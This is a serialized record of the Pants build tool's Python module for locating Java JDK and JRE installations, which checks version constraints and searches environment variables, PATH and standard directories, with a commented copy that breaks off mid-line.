os.path.basename(home)=='jre': jdk_dir=os.path.dirname(home) if self._is_executable(os.path.join(jdk_dir, 'bin', 'javac')): home=jdk_dir self._home=home return self._home @property def real_home(self): \"\"\"Real path to the distribution java.home(resolving links).\"\"\" return os.path.realpath(self.home) @property def java(self): \"\"\"Returns the path to this distribution's java command. If this distribution has no valid java command raises Distribution.Error. \"\"\" return self.binary('java') def binary(self, name): \"\"\"Returns the path to the command of the given name for this distribution. For example::: >>> d=Distribution() >>> jar=d.binary('jar') >>> jar '/usr/bin/jar' >>> If this distribution has no valid command of the given name raises Distribution.Error. If this distribution is a JDK checks both `bin` and `jre/bin` for the binary. \"\"\" if not isinstance(name, str): raise ValueError('name must be a binary name, given{} of type{}'.format(name, type(name))) self.validate() return self._validated_executable(name) def validate(self): \"\"\"Validates this distribution against its configured constraints. Raises Distribution.Error if this distribution is not valid according to the configured constraints. \"\"\" if self._validated_binaries: return with self._valid_executable('java') as java: if self._minimum_version: version=self._get_version(java) if version < self._minimum_version: raise self.Error('The java distribution at{} is too old; expecting at least{} and' ' got{}'.format(java, self._minimum_version, version)) if self._maximum_version: version=self._get_version(java) if version > self._maximum_version: raise self.Error('The java distribution at{} is too new; expecting no older than' '{} and got{}'.format(java, self._maximum_version, version)) self._bin_path=os.path.join(self.home, 'bin') try: self._validated_executable('javac') self._is_jdk=True except self.Error as e: if self._jdk: logger.debug('Failed to validate javac executable. Please check you have a JDK ' 'installed. Original error:{}'.format(e)) raise def execute_java(self, *args, **kwargs): return execute_java(*args, distribution=self, **kwargs) def execute_java_async(self, *args, **kwargs): return execute_java_async(*args, distribution=self, **kwargs) @memoized_method def _get_version(self, java): return _parse_java_version('java.version', self._get_system_properties(java)['java.version']) def _get_system_properties(self, java): if not self._system_properties: with temporary_dir() as classpath: with open(os.path.join(classpath, 'SystemProperties.class'), 'w+b') as fp: fp.write(pkgutil.get_data(__name__, 'SystemProperties.class')) cmd=[java, '-cp', classpath, 'SystemProperties'] process=subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE) stdout, stderr=process.communicate() if process.returncode !=0: raise self.Error('Failed to determine java system properties for{} with{} -exit code' '{}:{}'.format(java, ' '.join(cmd), process.returncode, stderr.decode('utf-8'))) props={} for line in stdout.decode('utf-8').split(os.linesep): key, _, val=line.partition('=') props[key]=val self._system_properties=props return self._system_properties def _validate_executable(self, name): def bin_paths(): yield self._bin_path if self._is_jdk: yield os.path.join(self.home, 'jre', 'bin') for bin_path in bin_paths(): exe=os.path.join(bin_path, name) if self._is_executable(exe): return exe raise self.Error('Failed to locate the{} executable,{} does not appear to be a' ' valid{} distribution'.format(name, self, 'JDK' if self._jdk else 'JRE')) def _validated_executable(self, name): exe=self._validated_binaries.get(name) if not exe: exe=self._validate_executable(name) self._validated_binaries[name]=exe return exe @contextmanager def _valid_executable(self, name): exe=self._validate_executable(name) yield exe self._validated_binaries[name]=exe def __repr__(self): return('Distribution({!r}, minimum_version={!r}, maximum_version={!r} jdk={!r})'.format( self._bin_path, self._minimum_version, self._maximum_version, self._jdk)) class _DistributionEnvironment(AbstractClass): class Location(namedtuple('Location',['home_path', 'bin_path'])): \"\"\"Represents the location of a java distribution.\"\"\" @classmethod def from_home(cls, home): \"\"\"Creates a location given the JAVA_HOME directory. :param string home: The path of the JAVA_HOME directory. :returns: The java distribution location. \"\"\" return cls(home_path=home, bin_path=None) @classmethod def from_bin(cls, bin_path): \"\"\"Creates a location given the `java` executable parent directory. :param string bin_path: The parent path of the `java` executable. :returns: The java distribution location. \"\"\" return cls(home_path=None, bin_path=bin_path) @abstractproperty def jvm_locations(self): \"\"\"Return the jvm locations discovered in this environment. :returns: An iterator over all discovered jvm locations. :rtype: iterator of:class:`DistributionEnvironment.Location` \"\"\" class _EnvVarEnvironment(_DistributionEnvironment): @property def jvm_locations(self): def env_home(home_env_var): home=os.environ.get(home_env_var) return self.Location.from_home(home) if home else None jdk_home=env_home('JDK_HOME') if jdk_home: yield jdk_home java_home=env_home('JAVA_HOME') if java_home: yield java_home search_path=os.environ.get('PATH') if search_path: for bin_path in search_path.strip().split(os.pathsep): yield self.Location.from_bin(bin_path) class _OSXEnvironment(_DistributionEnvironment): _OSX_JAVA_HOME_EXE='/usr/libexec/java_home' @classmethod def standard(cls): return cls(cls._OSX_JAVA_HOME_EXE) def __init__(self, osx_java_home_exe): self._osx_java_home_exe=osx_java_home_exe @property def jvm_locations(self): if os.path.exists(self._osx_java_home_exe): try: plist=subprocess.check_output([self._osx_java_home_exe, '--failfast', '--xml']) plist_results=plistlib.loads(plist) if PY3 else plistlib.readPlistFromString(plist) for distribution in plist_results: home=distribution['JVMHomePath'] yield self.Location.from_home(home) except subprocess.CalledProcessError: pass class _LinuxEnvironment(_DistributionEnvironment): _STANDARD_JAVA_DIST_DIRS=('/usr/lib/jvm', '/usr/lib64/jvm') @classmethod def standard(cls): return cls(*cls._STANDARD_JAVA_DIST_DIRS) def __init__(self, *java_dist_dirs): if len(java_dist_dirs)==0: raise ValueError('Expected at least 1 java dist dir.') self._java_dist_dirs=java_dist_dirs @property def jvm_locations(self): for java_dist_dir in self._java_dist_dirs: if os.path.isdir(java_dist_dir): for path in os.listdir(java_dist_dir): home=os.path.join(java_dist_dir, path) if os.path.isdir(home): yield self.Location.from_home(home) class _ExplicitEnvironment(_DistributionEnvironment): def __init__(self, *homes): self._homes=homes @property def jvm_locations(self): for home in self._homes: yield self.Location.from_home(home) class _UnknownEnvironment(_DistributionEnvironment): def __init__(self, *possible_environments): super(_DistributionEnvironment, self).__init__() if len(possible_environments) < 2: raise ValueError('At least two possible environments must be supplied.') self._possible_environments=possible_environments @property def jvm_locations(self): return itertools.chain(*(pe.jvm_locations for pe in self._possible_environments)) class _Locator(object): class Error(Distribution.Error): \"\"\"Error locating a java distribution.\"\"\" def __init__(self, distribution_environment, minimum_version=None, maximum_version=None): self._cache={} self._distribution_environment=distribution_environment self._minimum_version=minimum_version self._maximum_version=maximum_version def _scan_constraint_match(self, minimum_version, maximum_version, jdk): \"\"\"Finds a cached version matching the specified constraints :param Revision minimum_version: minimum jvm version to look for(eg, 1.7). :param Revision maximum_version: maximum jvm version to look for(eg, 1.7.9999). :param bool jdk: whether the found java distribution is required to have a jdk. :return: the Distribution, or None if no matching distribution is in the cache. :rtype::class:`pants.java.distribution.Distribution` \"\"\" for dist in self._cache.values(): if minimum_version and dist.version < minimum_version: continue if maximum_version and dist.version > maximum_version: continue if jdk and not dist.jdk: continue return dist def locate(self, minimum_version=None, maximum_version=None, jdk=False): \"\"\"Finds a java distribution that meets the given constraints and returns it. First looks for a cached version that was previously located, otherwise calls locate(). :param minimum_version: minimum jvm version to look for(eg, 1.7). The stricter of this and `--jvm-distributions-minimum-version` is used. :param maximum_version: maximum jvm version to look for(eg, 1.7.9999). The stricter of this and `--jvm-distributions-maximum-version` is used. :param bool jdk: whether the found java distribution is required to have a jdk. :return: the Distribution. :rtype::class:`Distribution` :raises::class:`Distribution.Error` if no suitable java distribution could be found. \"\"\" def _get_stricter_version(a, b, name, stricter): version_a=_parse_java_version(name, a) version_b=_parse_java_version(name, b) if version_a is None: return version_b if version_b is None: return version_a return stricter(version_a, version_b) minimum_version=_get_stricter_version(minimum_version, self._minimum_version, \"minimum_version\", max) maximum_version=_get_stricter_version(maximum_version, self._maximum_version, \"maximum_version\", min) key=(minimum_version, maximum_version, jdk) dist=self._cache.get(key) if not dist: dist=self._scan_constraint_match(minimum_version, maximum_version, jdk) if not dist: dist=self._locate(minimum_version=minimum_version, maximum_version=maximum_version, jdk=jdk) self._cache[key]=dist return dist def _locate(self, minimum_version=None, maximum_version=None, jdk=False): \"\"\"Finds a java distribution that meets any given constraints and returns it. :param minimum_version: minimum jvm version to look for(eg, 1.7). :param maximum_version: maximum jvm version to look for(eg, 1.7.9999). :param bool jdk: whether the found java distribution is required to have a jdk. :return: the located Distribution. :rtype::class:`Distribution` :raises::class:`Distribution.Error` if no suitable java distribution could be found. \"\"\" for location in itertools.chain(self._distribution_environment.jvm_locations): try: dist=Distribution(home_path=location.home_path, bin_path=location.bin_path, minimum_version=minimum_version, maximum_version=maximum_version, jdk=jdk) dist.validate() logger.debug('Located{} for constraints: minimum_version{}, maximum_version{}, jdk{}' .format(dist, minimum_version, maximum_version, jdk)) return dist except(ValueError, Distribution.Error) as e: logger.debug('{} is not a valid distribution because:{}' .format(location.home_path, str(e))) pass if(minimum_version is not None and maximum_version is not None and maximum_version < minimum_version): error_format=('Pants configuration/options led to impossible constraints for{} ' 'distribution: minimum_version{}, maximum_version{}') else: error_format=('Failed to locate a{} distribution with minimum_version{}, ' 'maximum_version{}') raise self.Error(error_format.format('JDK' if jdk else 'JRE', minimum_version, maximum_version)) class DistributionLocator(Subsystem): \"\"\"Subsystem that knows how to look up a java Distribution. Distributions are searched for in the following order by default: 1. Paths listed for this operating system in the `--jvm-distributions-paths` map. 2. JDK_HOME/JAVA_HOME 3. PATH 4. Likely locations on the file system such as `/usr/lib/jvm` on Linux machines. :API: public \"\"\" class Error(Distribution.Error): \"\"\"Error locating a java distribution. :API: public \"\"\" @classmethod def cached(cls, minimum_version=None, maximum_version=None, jdk=False): \"\"\"Finds a java distribution that meets the given constraints and returns it. :API: public First looks for a cached version that was previously located, otherwise calls locate(). :param minimum_version: minimum jvm version to look for(eg, 1.7). The stricter of this and `--jvm-distributions-minimum-version` is used. :param maximum_version: maximum jvm version to look for(eg, 1.7.9999). The stricter of this and `--jvm-distributions-maximum-version` is used. :param bool jdk: whether the found java distribution is required to have a jdk. :return: the Distribution. :rtype::class:`Distribution` :raises::class:`Distribution.Error` if no suitable java distribution could be found. \"\"\" try: return cls.global_instance()._locator().locate( minimum_version=minimum_version, maximum_version=maximum_version, jdk=jdk) except _Locator.Error as e: raise cls.Error('Problem locating a java distribution:{}'.format(e)) options_scope='jvm-distributions' @classmethod def register_options(cls, register): super(DistributionLocator, cls).register_options(register) human_readable_os_aliases=', '.join('{}:[{}]'.format(str(key), ', '.join(sorted(val))) for key, val in OS_ALIASES.items()) register('--paths', advanced=True, type=dict, help='Map of os names to lists of paths to jdks. These paths will be searched before ' 'everything else(before the JDK_HOME, JAVA_HOME, PATH environment variables) ' 'when locating a jvm to use. The same OS can be specified via several different ' 'aliases, according to this map:{}'.format(human_readable_os_aliases)) register('--minimum-version', advanced=True, help='Minimum version of the JVM pants will use') register('--maximum-version', advanced=True, help='Maximum version of the JVM pants will use') def all_jdk_paths(self): \"\"\"Get all explicitly configured JDK paths. :return: mapping of os name -> list of jdk_paths :rtype: dict of string -> list of string \"\"\" return self._normalized_jdk_paths @memoized_method def _locator(self): return self._create_locator() @memoized_property def _normalized_jdk_paths(self): normalized={} jdk_paths=self.get_options().paths or{} for name, paths in sorted(jdk_paths.items()): rename=normalize_os_name(name) if rename in normalized: logger.warning('Multiple OS names alias to \"{}\"; combining results.'.format(rename)) normalized[rename].extend(paths) else: normalized[rename]=paths return normalized def _get_explicit_jdk_paths(self): if not self._normalized_jdk_paths: return() os_name=normalize_os_name(os.uname()[0].lower()) if os_name not in self._normalized_jdk_paths: logger.warning('--jvm-distributions-paths was specified, but has no entry for \"{}\".' .format(os_name)) return self._normalized_jdk_paths.get(os_name,()) def _create_locator(self): homes=self._get_explicit_jdk_paths() environment=_UnknownEnvironment( _ExplicitEnvironment(*homes), _UnknownEnvironment( _EnvVarEnvironment(), _LinuxEnvironment.standard(), _OSXEnvironment.standard() ) ) return _Locator(environment, self.get_options().minimum_version, self.get_options().maximum_version) ", "sourceWithComments": "# coding=utf-8\n# Copyright 2014 Pants project contributors (see CONTRIBUTORS.md).\n# Licensed under the Apache License, Version 2.0 (see LICENSE).\n\nfrom __future__ import absolute_import, division, print_function, unicode_literals\n\nimport itertools\nimport logging\nimport os\nimport pkgutil\nimport plistlib\nfrom abc import abstractproperty\nfrom builtins import object, open, str\nfrom collections import namedtuple\nfrom contextlib import contextmanager\n\nfrom future.utils import PY3\nfrom six import string_types\n\nfrom pants.base.revision import Revision\nfrom pants.java.util import execute_java, execute_java_async\nfrom pants.subsystem.subsystem import Subsystem\nfrom pants.util.contextutil import temporary_dir\nfrom pants.util.memo import memoized_method, memoized_property\nfrom pants.util.meta import AbstractClass\nfrom pants.util.osutil import OS_ALIASES, normalize_os_name\nfrom pants.util.process_handler import subprocess\n\n\nlogger = logging.getLogger(__name__)\n\n\ndef _parse_java_version(name, version):\n  # Java version strings have been well defined since release 1.3.1 as defined here:\n  #  http://www.oracle.com/technetwork/java/javase/versioning-naming-139433.html\n  # These version strings comply with semver except that the traditional pre-release semver\n  # slot (the 4th) can be delimited by an _ in the case of update releases of the jdk.\n  # We accommodate that difference here using lenient parsing.\n  # We also accommodate specification versions, which just have major and minor\n  # components; eg: `1.8`.  These are useful when specifying constraints a distribution must\n  # satisfy; eg: to pick any 1.8 java distribution: '1.8' <= version <= '1.8.99'\n  if isinstance(version, string_types):\n    version = Revision.lenient(version)\n  if version and not isinstance(version, Revision):\n    raise ValueError('{} must be a string or a Revision object, given: {}'.format(name, version))\n  return version\n\n\nclass Distribution(object):\n  \"\"\"Represents a java distribution - either a JRE or a JDK installed on the local system.\n\n  In particular provides access to the distribution's binaries; ie: java while ensuring basic\n  constraints are met.  For example a minimum version can be specified if you know need to compile\n  source code or run bytecode that exercise features only available in that version forward.\n\n  :API: public\n\n  TODO(John Sirois): This class has a broken API, its not reasonably useful with no methods exposed.\n  Expose reasonable methods: https://github.com/pantsbuild/pants/issues/3263\n  \"\"\"\n\n  class Error(Exception):\n    \"\"\"Indicates an invalid java distribution.\"\"\"\n\n  @staticmethod\n  def _is_executable(path):\n    return os.path.isfile(path) and os.access(path, os.X_OK)\n\n  def __init__(self, home_path=None, bin_path=None, minimum_version=None, maximum_version=None,\n               jdk=False):\n    \"\"\"Creates a distribution wrapping the given `home_path` or `bin_path`.\n\n    Only one of `home_path` or `bin_path` should be supplied.\n\n    :param string home_path: the path to the java distribution's home dir\n    :param string bin_path: the path to the java distribution's bin dir\n    :param minimum_version: a modified semantic version string or else a Revision object\n    :param maximum_version: a modified semantic version string or else a Revision object\n    :param bool jdk: ``True`` to require the distribution be a JDK vs a JRE\n    \"\"\"\n    if home_path and not os.path.isdir(home_path):\n      raise ValueError('The specified java home path is invalid: {}'.format(home_path))\n    if bin_path and not os.path.isdir(bin_path):\n      raise ValueError('The specified binary path is invalid: {}'.format(bin_path))\n    if not bool(home_path) ^ bool(bin_path):\n      raise ValueError('Exactly one of home path or bin path should be supplied, given: '\n                       'home_path={} bin_path={}'.format(home_path, bin_path))\n\n    self._home = home_path\n    self._bin_path = bin_path or (os.path.join(home_path, 'bin') if home_path else '/usr/bin')\n\n    self._minimum_version = _parse_java_version(\"minimum_version\", minimum_version)\n    self._maximum_version = _parse_java_version(\"maximum_version\", maximum_version)\n    self._jdk = jdk\n    self._is_jdk = False\n    self._system_properties = None\n    self._validated_binaries = {}\n\n  @property\n  def jdk(self):\n    self.validate()\n    return self._is_jdk\n\n  @property\n  def system_properties(self):\n    \"\"\"Returns a dict containing the system properties of this java distribution.\"\"\"\n    return dict(self._get_system_properties(self.java))\n\n  @property\n  def version(self):\n    \"\"\"Returns the distribution version.\n\n    Raises Distribution.Error if this distribution is not valid according to the configured\n    constraints.\n    \"\"\"\n    return self._get_version(self.java)\n\n  def find_libs(self, names):\n    \"\"\"Looks for jars in the distribution lib folder(s).\n\n    If the distribution is a JDK, both the `lib` and `jre/lib` dirs will be scanned.\n    The endorsed and extension dirs are not checked.\n\n    :param list names: jar file names\n    :return: list of paths to requested libraries\n    :raises: `Distribution.Error` if any of the jars could not be found.\n    \"\"\"\n    def collect_existing_libs():\n      def lib_paths():\n        yield os.path.join(self.home, 'lib')\n        if self.jdk:\n          yield os.path.join(self.home, 'jre', 'lib')\n\n      for name in names:\n        for path in lib_paths():\n          lib_path = os.path.join(path, name)\n          if os.path.exists(lib_path):\n            yield lib_path\n            break\n        else:\n          raise Distribution.Error('Failed to locate {} library'.format(name))\n\n    return list(collect_existing_libs())\n\n  @property\n  def home(self):\n    \"\"\"Returns the distribution JAVA_HOME.\"\"\"\n    if not self._home:\n      home = self._get_system_properties(self.java)['java.home']\n      # The `jre/bin/java` executable in a JDK distribution will report `java.home` as the jre dir,\n      # so we check for this and re-locate to the containing jdk dir when present.\n      if os.path.basename(home) == 'jre':\n        jdk_dir = os.path.dirname(home)\n        if self._is_executable(os.path.join(jdk_dir, 'bin', 'javac')):\n          home = jdk_dir\n      self._home = home\n    return self._home\n\n  @property\n  def real_home(self):\n    \"\"\"Real path to the distribution java.home (resolving links).\"\"\"\n    return os.path.realpath(self.home)\n\n  @property\n  def java(self):\n    \"\"\"Returns the path to this distribution's java command.\n\n    If this distribution has no valid java command raises Distribution.Error.\n    \"\"\"\n    return self.binary('java')\n\n  def binary(self, name):\n    \"\"\"Returns the path to the command of the given name for this distribution.\n\n    For example: ::\n\n        >>> d = Distribution()\n        >>> jar = d.binary('jar')\n        >>> jar\n        '/usr/bin/jar'\n        >>>\n\n    If this distribution has no valid command of the given name raises Distribution.Error.\n    If this distribution is a JDK checks both `bin` and `jre/bin` for the binary.\n    \"\"\"\n    if not isinstance(name, str):\n      raise ValueError('name must be a binary name, given {} of type {}'.format(name, type(name)))\n    self.validate()\n    return self._validated_executable(name)\n\n  def validate(self):\n    \"\"\"Validates this distribution against its configured constraints.\n\n    Raises Distribution.Error if this distribution is not valid according to the configured\n    constraints.\n    \"\"\"\n    if self._validated_binaries:\n      return\n\n    with self._valid_executable('java') as java:\n      if self._minimum_version:\n        version = self._get_version(java)\n        if version < self._minimum_version:\n          raise self.Error('The java distribution at {} is too old; expecting at least {} and'\n                           ' got {}'.format(java, self._minimum_version, version))\n      if self._maximum_version:\n        version = self._get_version(java)\n        if version > self._maximum_version:\n          raise self.Error('The java distribution at {} is too new; expecting no older than'\n                           ' {} and got {}'.format(java, self._maximum_version, version))\n\n    # We might be a JDK discovered by the embedded jre `java` executable.\n    # If so reset the bin path to the true JDK home dir for full access to all binaries.\n    self._bin_path = os.path.join(self.home, 'bin')\n\n    try:\n      self._validated_executable('javac')  # Calling purely for the check and cache side effects\n      self._is_jdk = True\n    except self.Error as e:\n      if self._jdk:\n        logger.debug('Failed to validate javac executable. Please check you have a JDK '\n                      'installed. Original error: {}'.format(e))\n        raise\n\n  def execute_java(self, *args, **kwargs):\n    return execute_java(*args, distribution=self, **kwargs)\n\n  def execute_java_async(self, *args, **kwargs):\n    return execute_java_async(*args, distribution=self, **kwargs)\n\n  @memoized_method\n  def _get_version(self, java):\n    return _parse_java_version('java.version', self._get_system_properties(java)['java.version'])\n\n  def _get_system_properties(self, java):\n    if not self._system_properties:\n      with temporary_dir() as classpath:\n        with open(os.path.join(classpath, 'SystemProperties.class'), 'w+b') as fp:\n          fp.write(pkgutil.get_data(__name__, 'SystemProperties.class'))\n        cmd = [java, '-cp', classpath, 'SystemProperties']\n        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n        stdout, stderr = process.communicate()\n        if process.returncode != 0:\n          raise self.Error('Failed to determine java system properties for {} with {} - exit code'\n                           ' {}: {}'.format(java, ' '.join(cmd), process.returncode, stderr.decode('utf-8')))\n\n      props = {}\n      for line in stdout.decode('utf-8').split(os.linesep):\n        key, _, val = line.partition('=')\n        props[key] = val\n      self._system_properties = props\n\n    return self._system_properties\n\n  def _validate_executable(self, name):\n    def bin_paths():\n      yield self._bin_path\n      if self._is_jdk:\n        yield os.path.join(self.home, 'jre', 'bin')\n\n    for bin_path in bin_paths():\n      exe = os.path.join(bin_path, name)\n      if self._is_executable(exe):\n        return exe\n    raise self.Error('Failed to locate the {} executable, {} does not appear to be a'\n                     ' valid {} distribution'.format(name, self, 'JDK' if self._jdk else 'JRE'))\n\n  def _validated_executable(self, name):\n    exe = self._validated_binaries.get(name)\n    if not exe:\n      exe = self._validate_executable(name)\n      self._validated_binaries[name] = exe\n    return exe\n\n  @contextmanager\n  def _valid_executable(self, name):\n    exe = self._validate_executable(name)\n    yield exe\n    self._validated_binaries[name] = exe\n\n  def __repr__(self):\n    return ('Distribution({!r}, minimum_version={!r}, maximum_version={!r} jdk={!r})'.format(\n            self._bin_path, self._minimum_version, self._maximum_version, self._jdk))\n\n\nclass _DistributionEnvironment(AbstractClass):\n  class Location(namedtuple('Location', ['home_path', 'bin_path'])):\n    \"\"\"Represents the location of a java distribution.\"\"\"\n\n    @classmethod\n    def from_home(cls, home):\n      \"\"\"Creates a location given the JAVA_HOME directory.\n\n      :param string home: The path of the JAVA_HOME directory.\n      :returns: The java distribution location.\n      \"\"\"\n      return cls(home_path=home, bin_path=None)\n\n    @classmethod\n    def from_bin(cls, bin_path):\n      \"\"\"Creates a location given the `java` executable parent directory.\n\n      :param string bin_path: The parent path of the `java` executable.\n      :returns: The java distribution location.\n      \"\"\"\n      return cls(home_path=None, bin_path=bin_path)\n\n  @abstractproperty\n  def jvm_locations(self):\n    \"\"\"Return the jvm locations discovered in this environment.\n\n    :returns: An iterator over all discovered jvm locations.\n    :rtype: iterator of :class:`DistributionEnvironment.Location`\n    \"\"\"\n\n\nclass _EnvVarEnvironment(_DistributionEnvironment):\n  @property\n  def jvm_locations(self):\n    def env_home(home_env_var):\n      home = os.environ.get(home_env_var)\n      return self.Location.from_home(home) if home else None\n\n    jdk_home = env_home('JDK_HOME')\n    if jdk_home:\n      yield jdk_home\n\n    java_home = env_home('JAVA_HOME')\n    if java_home:\n      yield java_home\n\n    search_path = os.environ.get('PATH')\n    if search_path:\n      for bin_path in search_path.strip().split(os.pathsep):\n        yield self.Location.from_bin(bin_path)\n\n\nclass _OSXEnvironment(_DistributionEnvironment):\n  _OSX_JAVA_HOME_EXE = '/usr/libexec/java_home'\n\n  @classmethod\n  def standard(cls):\n    return cls(cls._OSX_JAVA_HOME_EXE)\n\n  def __init__(self, osx_java_home_exe):\n    self._osx_java_home_exe = osx_java_home_exe\n\n  @property\n  def jvm_locations(self):\n    # OSX will have a java_home tool that can be used to locate a unix-compatible java home dir.\n    #\n    # See:\n    #   https://developer.apple.com/library/mac/documentation/Darwin/Reference/ManPages/man1/java_home.1.html\n    #\n    # The `--xml` output looks like so:\n    # <?xml version=\"1.0\" encoding=\"UTF-8\"?>\n    # <!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\"\n    #                        \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n    # <plist version=\"1.0\">\n    #   <array>\n    #     <dict>\n    #       ...\n    #       <key>JVMHomePath</key>\n    #       <string>/Library/Java/JavaVirtualMachines/jdk1.7.0_45.jdk/Contents/Home</string>\n    #       ...\n    #     </dict>\n    #     ...\n    #   </array>\n    # </plist>\n    if os.path.exists(self._osx_java_home_exe):\n      try:\n        plist = subprocess.check_output([self._osx_java_home_exe, '--failfast', '--xml'])\n        plist_results = plistlib.loads(plist) if PY3 else plistlib.readPlistFromString(plist)\n        for distribution in plist_results:\n          home = distribution['JVMHomePath']\n          yield self.Location.from_home(home)\n      except subprocess.CalledProcessError:\n        pass\n\n\nclass _LinuxEnvironment(_DistributionEnvironment):\n  # The `/usr/lib/jvm` dir is a common target of packages built for redhat and debian as well as\n  # other more exotic distributions.  SUSE uses lib64\n  _STANDARD_JAVA_DIST_DIRS = ('/usr/lib/jvm', '/usr/lib64/jvm')\n\n  @classmethod\n  def standard(cls):\n    return cls(*cls._STANDARD_JAVA_DIST_DIRS)\n\n  def __init__(self, *java_dist_dirs):\n    if len(java_dist_dirs) == 0:\n      raise ValueError('Expected at least 1 java dist dir.')\n    self._java_dist_dirs = java_dist_dirs\n\n  @property\n  def jvm_locations(self):\n    for java_dist_dir in self._java_dist_dirs:\n      if os.path.isdir(java_dist_dir):\n        for path in os.listdir(java_dist_dir):\n          home = os.path.join(java_dist_dir, path)\n          if os.path.isdir(home):\n            yield self.Location.from_home(home)\n\n\nclass _ExplicitEnvironment(_DistributionEnvironment):\n  def __init__(self, *homes):\n    self._homes = homes\n\n  @property\n  def jvm_locations(self):\n    for home in self._homes:\n      yield self.Location.from_home(home)\n\n\nclass _UnknownEnvironment(_DistributionEnvironment):\n  def __init__(self, *possible_environments):\n    super(_DistributionEnvironment, self).__init__()\n    if len(possible_environments) < 2:\n      raise ValueError('At least two possible environments must be supplied.')\n    self._possible_environments = possible_environments\n\n  @property\n  def jvm_locations(self):\n    return itertools.chain(*(pe.jvm_locations for pe in self._possible_environments))\n\n\nclass _Locator(object):\n  class Error(Distribution.Error):\n    \"\"\"Error locating a java distribution.\"\"\"\n\n  def __init__(self, distribution_environment, minimum_version=None, maximum_version=None):\n    self._cache = {}\n    self._distribution_environment = distribution_environment\n    self._minimum_version = minimum_version\n    self._maximum_version = maximum_version\n\n  def _scan_constraint_match(self, minimum_version, maximum_version, jdk):\n    \"\"\"Finds a cached version matching the specified constraints\n\n    :param Revision minimum_version: minimum jvm version to look for (eg, 1.7).\n    :param Revision maximum_version: maximum jvm version to look for (eg, 1.7.9999).\n    :param bool jdk: whether the found java distribution is required to have a jdk.\n    :return: the Distribution, or None if no matching distribution is in the cache.\n    :rtype: :class:`pants.java.distribution.Distribution`\n    \"\"\"\n\n    for dist in self._cache.values():\n      if minimum_version and dist.version < minimum_version:\n        continue\n      if maximum_version and dist.version > maximum_version:\n        continue\n      if jdk and not dist.jdk:\n        continue\n      return dist\n\n  def locate(self, minimum_version=None, maximum_version=None, jdk=False):\n    \"\"\"Finds a java distribution that meets the given constraints and returns it.\n\n    First looks for a cached version that was previously located, otherwise calls locate().\n    :param minimum_version: minimum jvm version to look for (eg, 1.7).\n                            The stricter of this and `--jvm-distributions-minimum-version` is used.\n    :param maximum_version: maximum jvm version to look for (eg, 1.7.9999).\n                            The stricter of this and `--jvm-distributions-maximum-version` is used.\n    :param bool jdk: whether the found java distribution is required to have a jdk.\n    :return: the Distribution.\n    :rtype: :class:`Distribution`\n    :raises: :class:`Distribution.Error` if no suitable java distribution could be found.\n    \"\"\"\n\n    def _get_stricter_version(a, b, name, stricter):\n      version_a = _parse_java_version(name, a)\n      version_b = _parse_java_version(name, b)\n      if version_a is None:\n        return version_b\n      if version_b is None:\n        return version_a\n      return stricter(version_a, version_b)\n\n    # Take the tighter constraint of method args and subsystem options.\n    minimum_version = _get_stricter_version(minimum_version,\n                                            self._minimum_version,\n                                            \"minimum_version\",\n                                            max)\n    maximum_version = _get_stricter_version(maximum_version,\n                                            self._maximum_version,\n                                            \"maximum_version\",\n                                            min)\n\n    key = (minimum_version, maximum_version, jdk)\n    dist = self._cache.get(key)\n    if not dist:\n      dist = self._scan_constraint_match(minimum_version, maximum_version, jdk)\n      if not dist:\n        dist = self._locate(minimum_version=minimum_version,\n                            maximum_version=maximum_version,\n                            jdk=jdk)\n      self._cache[key] = dist\n    return dist\n\n  def _locate(self, minimum_version=None, maximum_version=None, jdk=False):\n    \"\"\"Finds a java distribution that meets any given constraints and returns it.\n\n    :param minimum_version: minimum jvm version to look for (eg, 1.7).\n    :param maximum_version: maximum jvm version to look for (eg, 1.7.9999).\n    :param bool jdk: whether the found java distribution is required to have a jdk.\n    :return: the located Distribution.\n    :rtype: :class:`Distribution`\n    :raises: :class:`Distribution.Error` if no suitable java distribution could be found.\n    \"\"\"\n    for location in itertools.chain(self._distribution_environment.jvm_locations):\n      try:\n        dist = Distribution(home_path=location.home_path,\n                            bin_path=location.bin_path,\n                            minimum_version=minimum_version,\n                            maximum_version=maximum_version,\n                            jdk=jdk)\n        dist.validate()\n        logger.debug('Located {} for constraints: minimum_version {}, maximum_version {}, jdk {}'\n                     .format(dist, minimum_version, maximum_version, jdk))\n        return dist\n      except (ValueError, Distribution.Error) as e:\n        logger.debug('{} is not a valid distribution because: {}'\n                     .format(location.home_path, str(e)))\n        pass\n\n    if (minimum_version is not None\n        and maximum_version is not None\n        and maximum_version < minimum_version):\n      error_format = ('Pants configuration/options led to impossible constraints for {} '\n                      'distribution: minimum_version {}, maximum_version {}')\n    else:\n      error_format = ('Failed to locate a {} distribution with minimum_version {}, '\n                      'maximum_version {}')\n    raise self.Error(error_format.format('JDK' if jdk else 'JRE', minimum_version, maximum_version))\n\n\nclass DistributionLocator(Subsystem):\n  \"\"\"Subsystem that knows how to look up a java Distribution.\n\n  Distributions are searched for in the following order by default:\n\n  1. Paths listed for this operating system in the `--jvm-distributions-paths` map.\n  2. JDK_HOME/JAVA_HOME\n  3. PATH\n  4. Likely locations on the file system such as `/usr/lib/jvm` on Linux machines.\n\n  :API: public\n  \"\"\"\n\n  class Error(Distribution.Error):\n    \"\"\"Error locating a java distribution.\n\n    :API: public\n    \"\"\"\n\n  @classmethod\n  def cached(cls, minimum_version=None, maximum_version=None, jdk=False):\n    \"\"\"Finds a java distribution that meets the given constraints and returns it.\n\n    :API: public\n\n    First looks for a cached version that was previously located, otherwise calls locate().\n    :param minimum_version: minimum jvm version to look for (eg, 1.7).\n                            The stricter of this and `--jvm-distributions-minimum-version` is used.\n    :param maximum_version: maximum jvm version to look for (eg, 1.7.9999).\n                            The stricter of this and `--jvm-distributions-maximum-version` is used.\n    :param bool jdk: whether the found java distribution is required to have a jdk.\n    :return: the Distribution.\n    :rtype: :class:`Distribution`\n    :raises: :class:`Distribution.Error` if no suitable java distribution could be found.\n    \"\"\"\n    try:\n      return cls.global_instance()._locator().locate(\n          minimum_version=minimum_version,\n          maximum_version=maximum_version,\n          jdk=jdk)\n    except _Locator.Error as e:\n      raise cls.Error('Problem locating a java distribution: {}'.format(e))\n\n  options_scope = 'jvm-distributions'\n\n  @classmethod\n  def register_options(cls, register):\n    super(DistributionLocator, cls).register_options(register)\n    human_readable_os_aliases = ', '.join('{}: [{}]'.format(str(key), ', 